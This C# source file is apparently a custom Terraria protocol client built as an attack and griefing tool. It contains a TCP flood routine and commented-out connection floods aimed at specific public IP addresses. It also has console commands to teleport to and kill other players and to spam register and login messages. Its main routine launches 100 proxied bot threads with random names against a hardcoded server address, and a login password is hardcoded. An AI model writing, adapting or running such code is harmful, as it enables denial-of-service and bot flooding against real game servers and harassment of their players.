using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using TerrariaProtocol.DataStructures;

namespace TerrariaProtocol
{
    class Program
    {
        private static ProxyPool pool = new ProxyPool();

        public class SectionIterator : IEnumerator<Tuple<int, int>>, IEnumerable<Tuple<int, int>>
        {
            private int x;
            private int y;
            private readonly int maxX;
            private readonly int maxY;

            public Tuple<int, int> Current => new Tuple<int, int>(x, y);
            object IEnumerator.Current => Current;

            const int step = 1;
            public SectionIterator(int maxX, int maxY)
            {
                this.maxX = maxX / 200;
                this.maxY = maxY / 200;
                x = 0;
                y = 0;
            }

            public void Dispose()
            {
            }

            public bool MoveNext()
            {
                x += step;
                if (x >= maxX)
                {
                    x = 0;
                    y += step;
                }
                return x + step < maxX || y + step < maxY;
            }

            public void Reset()
            {
                x = 0;
                y = 0;
            }

            public IEnumerator<Tuple<int, int>> GetEnumerator()
            {
                return this;
            }

            IEnumerator IEnumerable.GetEnumerator()
            {
                return GetEnumerator();
            }
        }

        private static object totalbytes = 0;
        private static async Task TcpConnection(string host, ushort port)
        {

            byte[] b = new byte[50000];
            for (var i = 0; i < 50000; ++i) b[i] = 2;
            TcpClient client = null;

            while (true)
            {
                try
                {
                    
                    await client.GetStream().WriteAsync(b, 0, 50000);
                    lock (totalbytes)
                        totalbytes = (int)totalbytes + 50000;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                    try
                    {
                        client = new TcpClient();
                        await client.ConnectAsync(host, port);
                    }
                    catch { }
                }
            }
        }
        static void Main(string[] args)
        {
            /*
            List<TcpClient> list = new List<TcpClient>();

            while (true)
            {
                try
                {
                    TcpClient c = new TcpClient();
                    Console.WriteLine("connecting...");
                    c.Connect("103.45.187.65", 60489);
                    c.GetStream().Write(new byte[] { 0, 0 }, 0, 2);
                    list.Add(c);
                }
                catch (Exception e) { Console.WriteLine(e); }
            }*/


            //TClient client = new TClient();

            /*
            new Thread(new ThreadStart(delegate ()
            {
                Random rand = new Random();
                while (!client.IsPlaying) ;
                while (true)
                foreach (Tuple<int, int> section in new SectionIterator(client.Map.maxTilesX, client.Map.maxTilesY))
                {
                    //if (client.Map.SectionReceived[section.Item1, section.Item2]) continue;
                    Console.WriteLine($"Teleporting for section ({section.Item1}, {section.Item2})");
                    client.PlayerUpdate(0, 0,
                        new Vector2(section.Item1 * 3200 + rand.Next(-1600, 1600),
                                    section.Item2 * 3200 + rand.Next(-1600, 1600)),
                        new Vector2(), 0);
                    Thread.Sleep(50);
                }
            })).Start();*/

            /*
                new Thread(new ThreadStart(delegate ()
            {
                while (!client.IsPlaying) ;
                while (true)
                {
                    Thread.Sleep(1000);
                    if (client.Map != null)
                    {
                        Console.WriteLine("saving world...please wait");
                        using (FileStream fs = new FileStream("C:\\Users\\Administrator\\Documents\\My Games\\Terraria\\Worlds\\output.wld", FileMode.Create))
                        using (BinaryWriter bw = new BinaryWriter(fs))
                            client.Map.SaveWorld_Version2(bw);
                        Console.WriteLine("map saved");
                    }
                }
            })).Start();
            */

            //HashSet<byte> enemies = new HashSet<byte>();

            /*
            new Thread(new ThreadStart(delegate ()
            {
                while (true)
                {
                    foreach (byte slot in enemies)
                    {
                        if (slot == client.PlayerSlot) continue;
                        Console.WriteLine("Killing " + client.Players[slot].playerInfo.Name);
                        client.Teleport(client.Players[slot].position);
                        client.Kill(slot);
                    }
                    Thread.Sleep(500);
                }
            })).Start();
            */
            /*
            client.OnTogglePvp += delegate (TClient self, byte slot)
            {
                if (self.Players[slot].hostile)
                    enemies.Add(slot);
                else
                    enemies.Remove(slot);
            };
            */
            //client.GameLoop(new IPEndPoint(IPAddress.Loopback, 7777), "");

            //client.OnTileSendSection += delegate (TClient self, int x, int y, short w, short h)
            //{
            /*
            short size = Math.Max(w, h);
            Packet tile = new Packet(PacketTypes.TileSendSquare);
            tile.Writer.Write(size);
            tile.Writer.Write((short)x);
            tile.Writer.Write((short)y);
            for (int i = 0; i < size * size; ++i)
                tile.Writer.Write(0);
            client.Send(tile);*/
            //};

            /*
            var total = 0;
            while (true)
            {
                try
                {
                    TcpClient tc = new TcpClient();
                    tc.Connect("47.115.30.116", 7777);
                    Console.WriteLine($"Writing boom packet #{++total}");
                    tc.GetStream().Write(new byte[] { 0, 0 }, 0, 2);
                }
                catch { }
            }*/

            var client = new TClient();
            var r = new Random();

            client.OnSendPlayer += delegate (TClient self, ref Player player)
            {
                player.playerInfo.Name = r.Next().ToString();
                player.playerInfo.difficulty = Difficulty.Normal;
            };

            client.OnSpawn += delegate (TClient self)
            {
                //self.ChatText("/register 1176321897");
                //self.ChatText("/login 1176321897");
            };

            client.OnChat += delegate (TClient self, string text, Color color)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine(text);
                Console.ResetColor();
            };

            client.OnStatusBar += delegate (TClient self, string text)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(text);
                Console.ResetColor();
            };

            client.CurRelease = "Terraria230";

            new Thread(new ThreadStart(delegate ()
            {
                while (true)
                {
                    string text = Console.ReadLine();
                    string[] splits = text.Split(' ');
                    try
                    {
                        if (splits.Length > 0)
                        {
                            switch (splits[0])
                            {
                                case "/sof":
                                    {
                                        var pos = client.MyPlayer.position;
                                        short x = (short)(pos.X / 16), y = (short)(pos.Y / 16);
                                        client.ChangeItem(0);

                                        client.GiveItem(0, 2, 0, 1);
                                        client.PlaceTile(x, (short)(y - 1), 0);
                                        client.PlaceTile((short)(x + 1), (short)(y - 1), 0);
                                        client.PlaceTile((short)(x + 2), (short)(y - 1), 0);
                                        client.PlaceTile((short)(x + 3), (short)(y - 1), 0);
                                        client.PlaceTile((short)(x + 4), (short)(y - 1), 0);

                                        client.GiveItem(0, 3816, 0, 1);
                                        client.PlaceTile((short)(x + 2), (short)(y - 2), 466);
                                        break;
                                    }
                                case "/tppos":
                                    {
                                        Vector2 pos = new Vector2(short.Parse(splits[1]) * 16f, short.Parse(splits[2]) * 16f);
                                        Console.WriteLine($"Teleporting to ({pos.X}, {pos.Y})");
                                        client.Teleport(pos);
                                        break;
                                    }
                                case "/tp":
                                    {
                                        Vector2 pos = client.Players[byte.Parse(splits[1])].position;
                                        Console.WriteLine($"Teleporting to ({pos.X}, {pos.Y})");
                                        client.Teleport(pos);
                                        break;
                                    }
                                case "/kill":
                                    Console.WriteLine($"killing player {splits[1]}...");
                                    client.Teleport(client.Players[byte.Parse(splits[1])].position);
                                    client.Kill(byte.Parse(splits[1]));
                                    break;
                                case "/spam":
                                    while (true)
                                    {
                                        client.ChatText("/register 1234");
                                        client.ChatText("/login 111 111");
                                    }
                                    break;
                                case "/pvp":
                                    client.TogglePvp(bool.Parse(splits[1]));
                                    break;
                                case "/savemap":
                                    if (client.Map != null)
                                    {
                                        Console.WriteLine("saving world...please wait");
                                        using (FileStream fs = new FileStream("C:\\Users\\Administrator\\Documents\\My Games\\Terraria\\Worlds\\output.wld", FileMode.Create))
                                        using (BinaryWriter bw = new BinaryWriter(fs))
                                            client.Map.SaveWorld_Version2(bw);
                                        Console.WriteLine("map saved");
                                    }
                                    break;
                                case "/section":
                                    Random rand = new Random();
                                    foreach (Tuple<int, int> section in new SectionIterator(client.Map.maxTilesX, client.Map.maxTilesY))
                                    {
                                        //if (client.Map.SectionReceived[section.Item1, section.Item2]) continue;
                                        Console.WriteLine($"Teleporting for section ({section.Item1}, {section.Item2})");
                                        client.PlayerUpdate(0, 0,
                                            new Vector2(section.Item1 * 3200 + rand.Next(0, 3200),
                                                        section.Item2 * 3200 + rand.Next(0, 3200)),
                                            new Vector2(), 0);
                                        Thread.Sleep(50);
                                    }
                                    break;
                                default:
                                    Console.WriteLine("sending chat: " + text);
                                    client.ChatText(text);
                                    break;
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine(e);
                        Console.ResetColor();
                    }
                }
            })).Start();

            client.GameLoop(new IPEndPoint(IPAddress.Parse("127.0.0.1"), 7777), "1176321897");
            client.GameLoop(new IPEndPoint(IPAddress.Parse("43.248.189.77"), 7001), "1176321897");
            
            
            pool.GetProxysFromAPIs();

            for (int i = 0; i < 100; ++i)
                new Thread(new ThreadStart(() =>
                {
                    var r2 = new Random();
                    var proxys = pool.proxys.ToArray();
                    while (true)
                    {
                        var proxy = proxys[r.Next(0, proxys.Length)];
                        //proxy = new IPEndPoint(IPAddress.Parse("221.122.91.75"), 10286);
                        var client2 = new TClient();

                        client2.OnSendPlayer += delegate (TClient self, ref Player player)
                        {
                            player.playerInfo.Name = r.Next().ToString();
                            player.playerInfo.difficulty = Difficulty.Normal;
                        };

                        client2.OnSpawn += delegate (TClient self)
                        {
                            Vector2 pos = new Vector2(1600, 1600);
                            client.Teleport(pos);
                            Console.WriteLine($"Teleporting to ({pos.X}, {pos.Y})");

                            var pos2 = client.MyPlayer.position;
                            short x = (short)(pos2.X / 16), y = (short)(pos2.Y / 16);
                            client.ChangeItem(0);

                            client.GiveItem(0, 2, 0, 1);
                            client.PlaceTile(x, (short)(y - 1), 0);
                            client.PlaceTile((short)(x + 1), (short)(y - 1), 0);
                            client.PlaceTile((short)(x + 2), (short)(y - 1), 0);
                            client.PlaceTile((short)(x + 3), (short)(y - 1), 0);
                            client.PlaceTile((short)(x + 4), (short)(y - 1), 0);

                            client.GiveItem(0, 3816, 0, 1);
                            client.PlaceTile((short)(x + 2), (short)(y - 2), 466);
                            Console.WriteLine($"tile placed at ({pos2.X}, {pos2.Y})");
                        };

                        client2.OnChat += delegate (TClient self, string text, Color color)
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine(text);
                            Console.ResetColor();
                        };

                        client2.OnStatusBar += delegate (TClient self, string text)
                        {
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine(text);
                            Console.ResetColor();
                        };

                        client2.CurRelease = "Terraria230";

                        try
                        {
                            client2.GameLoop(new IPEndPoint(IPAddress.Parse("43.248.189.77"), 7001), "", proxy);
                        }
                        catch (Exception e)
                        {
                        }
                    }
                })).Start();
        }
    }
}
